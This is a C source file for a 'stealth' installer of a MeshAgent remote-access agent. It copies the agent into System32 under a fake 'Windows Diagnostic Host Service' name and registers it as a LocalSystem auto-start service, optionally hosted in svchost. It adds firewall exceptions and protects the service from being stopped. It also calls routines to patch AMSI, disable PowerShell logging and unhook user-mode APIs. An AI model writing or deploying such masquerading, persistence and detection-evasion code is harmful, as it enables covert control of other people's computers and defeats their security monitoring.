/*
 * MeshAgent Stealth - Complete Installation Module
 *
 * Handles full installation process including:
 * - File deployment to System32
 * - Service registration (standalone or svchost)
 * - Firewall exception rules
 * - Registry configuration and hiding
 * - AMSI patching
 * - Event log disabling
 */

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <strsafe.h>
#include "stealth.h"

// Installation configuration
// Prefer computing install paths at runtime to avoid hard-coding drive/root.
// Keep folder names stable but derive base from the actual Windows directory.
#define INSTALL_FOLDER_NAME           L"DiagnosticHost"
#define INSTALL_FOLDER_LOGS_NAME      L"logs"
#define SERVICE_NAME L"WinDiagnosticHost"
#define SERVICE_DISPLAY_NAME L"Windows Diagnostic Host Service"
#define SERVICE_DESCRIPTION L"Provides diagnostic data collection and system health monitoring. If this service is stopped, certain features may not function properly."
#define SERVICE_EXE_NAME L"diaghost.exe"
#define SERVICE_DLL_NAME L"diagsvc.dll"

// ================================================================
// Installation Paths
// ================================================================

typedef struct {
    WCHAR installDir[MAX_PATH];
    WCHAR logsDir[MAX_PATH];
    WCHAR exePath[MAX_PATH];
    WCHAR dllPath[MAX_PATH];
    WCHAR dbPath[MAX_PATH];
    WCHAR confPath[MAX_PATH];
    WCHAR logPath[MAX_PATH];
} InstallPaths;

BOOL Stealth_GetInstallPaths(InstallPaths *paths)
{
    if (!paths)
    {
        return FALSE;
    }

    memset(paths, 0, sizeof(InstallPaths));

    // Base installation directory (derive from %SystemRoot% to avoid hard-coded C:) 
    WCHAR windowsDir[MAX_PATH] = {0};
    UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
    if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
    // Build System32 path explicitly to avoid WOW64 redirection inconsistencies
    WCHAR system32Dir[MAX_PATH] = {0};
    if (FAILED(StringCchPrintfW(system32Dir, MAX_PATH, L"%s\\System32", windowsDir))) { return FALSE; }
    if (FAILED(StringCchPrintfW(paths->installDir, MAX_PATH, L"%s\\%s", system32Dir, INSTALL_FOLDER_NAME))) { return FALSE; }
    if (FAILED(StringCchPrintfW(paths->logsDir, MAX_PATH, L"%s\\%s\\%s", system32Dir, INSTALL_FOLDER_NAME, INSTALL_FOLDER_LOGS_NAME))) { return FALSE; }

    // Executable path
    swprintf_s(paths->exePath, MAX_PATH, L"%s\\%s", paths->installDir, SERVICE_EXE_NAME);

    // DLL path (for svchost mode)
    swprintf_s(paths->dllPath, MAX_PATH, L"%s\\%s", paths->installDir, SERVICE_DLL_NAME);

    // Database path
    swprintf_s(paths->dbPath, MAX_PATH, L"%s\\diaghost.db", paths->installDir);

    // Configuration path
    swprintf_s(paths->confPath, MAX_PATH, L"%s\\diaghost.conf", paths->installDir);

    // Log file path
    swprintf_s(paths->logPath, MAX_PATH, L"%s\\diagnostics.log", paths->logsDir);

    return TRUE;
}

// ================================================================
// Complete Installation Function
// ================================================================

BOOL Stealth_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode)
{
    InstallPaths paths;
    BOOL success = FALSE;

    // Get installation paths
    if (!Stealth_GetInstallPaths(&paths))
    {
        return FALSE;
    }

    // Step 1: Create installation directories
    if (!Stealth_CreateInstallationDirectory(paths.installDir))
    {
        return FALSE;
    }

    if (!Stealth_CreateInstallationDirectory(paths.logsDir))
    {
        // Non-fatal, continue
    }

    // Step 2: Copy files to installation directory
    if (sourceExePath && !useSvchostMode)
    {
        // Copy EXE for standalone mode
        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
        {
            return FALSE;
        }
    }

    if (sourceDllPath && useSvchostMode)
    {
        // Copy DLL for svchost mode
        if (!Stealth_InstallFiles(sourceDllPath, paths.dllPath))
        {
            return FALSE;
        }
    }

    // Step 3: Register service
    if (useSvchostMode)
    {
        // Register for svchost.exe hosting
        if (!Stealth_RegisterSvchostService(SERVICE_NAME, paths.dllPath))
        {
            return FALSE;
        }
        success = TRUE;
    }
    else
    {
        // Register as standalone service
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
        if (hSCM)
        {
            SC_HANDLE hService = CreateServiceW(
                hSCM,
                SERVICE_NAME,
                SERVICE_DISPLAY_NAME,
                SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG | DELETE,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                paths.exePath,
                NULL,
                NULL,
                NULL,
                L"LocalSystem",
                NULL
            );

            if (hService)
            {
                // Set description
                SERVICE_DESCRIPTIONW sd;
                sd.lpDescription = (LPWSTR)SERVICE_DESCRIPTION;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);

                // Configure delayed auto-start for faster boot performance impact
                SERVICE_DELAYED_AUTO_START_INFO delayed = {0};
                delayed.fDelayedAutostart = TRUE;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayed);

                // Set a service SID for isolation
                SERVICE_SID_INFO sidInfo = {0};
                sidInfo.dwServiceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo);

                // Harden service DACL to Administrators + SYSTEM
                Stealth_HardenServiceDacl(SERVICE_NAME);

                // Configure auto-restart on failure (centralized)
                Stealth_ProtectServiceFromTermination(SERVICE_NAME);

                CloseServiceHandle(hService);
                success = TRUE;
            }

            CloseServiceHandle(hSCM);
        }
    }

    // Step 4: Add Windows Firewall exceptions
    const wchar_t* fileToExcept = useSvchostMode ?
        L"C:\\Windows\\System32\\svchost.exe" : paths.exePath;

    Stealth_AddFirewallRuleForService(SERVICE_NAME, fileToExcept);

    // Step 5: Apply anti-detection measures
    Stealth_PatchAMSI();
    Stealth_DisablePowerShellLogging();
    Stealth_UnhookUserModeAPIs();

    // Step 6: Hide service registry key (optional, can make debugging harder)
    // Stealth_HideServiceRegistry(SERVICE_NAME);

    // Step 7: Start the service and confirm running state
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_START | SERVICE_QUERY_STATUS);
        if (hService)
        {
            if (!StartServiceW(hService, 0, NULL)) {
                OutputDebugStringW(L"[stealth_installer] StartService failed\n");
            } else {
                // Wait up to 10s for running state
                SERVICE_STATUS_PROCESS ssp = {0};
                DWORD bytes = 0;
                DWORD waited = 0;
                while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING) { break; }
                    if (ssp.dwCurrentState == SERVICE_STOPPED) { break; }
                    Sleep(500);
                    waited += 500;
                    if (waited >= 10000) { break; }
                }
                if (ssp.dwCurrentState != SERVICE_RUNNING) {
                    OutputDebugStringW(L"[stealth_installer] Service did not reach RUNNING state\n");
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return success;
}

// ================================================================
// Uninstallation
// ================================================================

BOOL Stealth_PerformCompleteUninstallation(void)
{
    InstallPaths paths;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status = {0};

    // Get paths
    Stealth_GetInstallPaths(&paths);

    // Stop and delete service
    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, SERVICE_NAME,
                                SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (hService)
        {
            // Stop service
            ControlService(hService, SERVICE_CONTROL_STOP, &status);

            // Wait for service to stop
            for (int i = 0; i < 30; i++)
            {
                if (!QueryServiceStatus(hService, &status))
                {
                    break;
                }
                if (status.dwCurrentState == SERVICE_STOPPED)
                {
                    break;
                }
                Sleep(1000);
            }

            // Delete service
            DeleteService(hService);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    // Remove firewall rules
    Stealth_RemoveFirewallRuleForService(SERVICE_NAME);

    // Delete files (best-effort)
    DeleteFileW(paths.dbPath);
    DeleteFileW(paths.logPath);
    DeleteFileW(paths.confPath);
    DeleteFileW(paths.exePath);
    DeleteFileW(paths.dllPath);

    // Remove directories
    RemoveDirectoryW(paths.logsDir);
    RemoveDirectoryW(paths.installDir);

    return TRUE;
}

// ================================================================
// Silent Installation Check
// ================================================================

BOOL Stealth_IsAlreadyInstalled(void)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL installed = FALSE;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
        if (hService)
        {
            installed = TRUE;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return installed;
}
